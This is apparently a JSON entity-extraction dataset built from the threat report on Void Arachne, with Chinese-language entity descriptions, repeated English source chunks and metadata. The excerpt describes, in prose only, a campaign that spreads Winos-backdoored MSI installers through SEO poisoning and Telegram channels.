{
  "entities": [
    {
      "name": "Telegram Channels",
      "type": "Asset",
      "id": "asset--telegram-channels",
      "description": "攻击者用于分发恶意安装文件的Telegram频道",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious MSI Files",
      "type": "Tool",
      "id": "tool--malicious-msi",
      "description": "包含合法软件和恶意Winos载荷的恶意MSI文件",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Backdoor Installation Process",
      "type": "Procedure",
      "id": "procedure--backdoor-installation",
      "description": "在安装过程中部署Winos后门的程序",
      "labels": "Procedure",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--void-arachne-campaign",
      "description": "威胁情报报告，详细描述了Void Arachne组织针对中文用户的攻击活动",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Winos Backdoor",
      "type": "Tool",
      "id": "tool--winos-backdoor",
      "description": "具有远程控制能力的后门工具，用于完全系统控制",
      "labels": "Tool",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning",
      "type": "Technique",
      "id": "technique--seo-poisoning",
      "description": "搜索引擎优化投毒技术，用于分发恶意文件",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Speaking Users",
      "type": "Target",
      "id": "target--chinese-users",
      "description": "中文用户，特别是对AI软件和VPN服务感兴趣的群体",
      "labels": "Target",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Attacker-Controlled Web Servers",
      "type": "Asset",
      "id": "asset--web-servers",
      "description": "攻击者控制的Web服务器，用于分发恶意文件",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Void Arachne",
      "type": "ThreatOrganization",
      "id": "threat-org--void-arachne",
      "description": "新发现的威胁组织，针对中文用户发起攻击活动",
      "labels": "ThreatOrganization",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Social Media and Messaging Platforms Distribution",
      "type": "Technique",
      "id": "technique--social-media-distribution",
      "description": "通过社交媒体和消息平台分发恶意软件的技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious MSI Campaign",
      "type": "AttackEvent",
      "id": "attack-event--msi-campaign",
      "description": "使用恶意MSI文件的攻击活动，捆绑合法软件和恶意Winos载荷",
      "labels": "AttackEvent",
      "chunks_info": [
        {
          "chunk_id": 0,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese  \n**Report highlights:**  \n* We recently discovered a new threat actor group that we dubbed Void Arachne. This group targets Chinese-speaking users with malicious Windows Installer (MSI) files in a recent campaign. These MSI files contain legitimate software installer files for AI software and other popular software but are bundled with malicious Winos payloads.\n* The campaign also promotes compromised MSI files embedded with nudifiers and deepfake pornography-generating software, as well as AI voice and facial technologies.\n* The campaign uses SEO poisoning tactics and social media and messaging platforms to distribute malware.\n* The malware installs a Winos backdoor during the installation process, which could lead to a full system compromise.\n* Due to strict government control in China, VPN services and public interest in this technology have notably increased. And in this Void Arachne campaign, we’ve observed how threat actors are exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nIn early April, we discovered that a new threat actor group (which we call Void Arachne) was targeting Chinese-speaking users. Void Arachne’s campaign involves the use of malicious MSI files that contain legitimate software installer files for [artificial intelligence (AI)](/en_us/business/ai.html) software as well as other popular software. The malicious Winos payloads are bundled alongside nudifiers and deepfake pornography-generating AI software, voice-and-face-swapping AI software, zh-CN (Simplified Chinese) language packs, the simplified Chinese version of Google Chrome, and Chinese-marketed virtual private networks (VPNs), such as LetsVPN and QuickVPN. During the process of installation, a Winos backdoor is also installed, which could also lead to full system compromise.  \nDuring this campaign, we observed numerous malicious installer files being shared across several Telegram channels. We also saw attacker-controlled web servers that distribute malicious files through search engine optimization (SEO) poisoning attacks. These MSI files act as backdoored installers, serving both the non-malicious software and the Winos 4.0 command-and-control (C&C) framework implant, which could lead to a full system compromise. Winos (not to be confused with the Windows operating system) is a backdoor used by Chinese threat actors with an extensive array of capabilities for remotely controlling a compromised computer.",
          "chunk_length": 2545,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese"
            ],
            "content_type": "text",
            "token_length": 519,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "has_full_header_context": true,
            "Header 2": "",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 0,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Chinese-Language Telegram Channels",
      "type": "Asset",
      "id": "asset--telegram-channels",
      "description": "中文主题的Telegram频道",
      "labels": "Asset",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Malicious Package Distribution",
      "type": "Technique",
      "id": "technique--malicious-package",
      "description": "恶意软件包分发技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "Behind the Great Wall Void Arachne Targets Chinese",
      "type": "Report",
      "id": "report--great-wall",
      "description": "威胁情报报告",
      "labels": "Report",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 1,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "name": "SEO Poisoning",
      "type": "Technique",
      "id": "technique--seo-poisoning",
      "description": "搜索引擎优化投毒技术",
      "labels": "Technique",
      "chunks_info": [
        {
          "chunk_id": 1,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Attack diagram  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Attack diagram",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Attack diagram"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
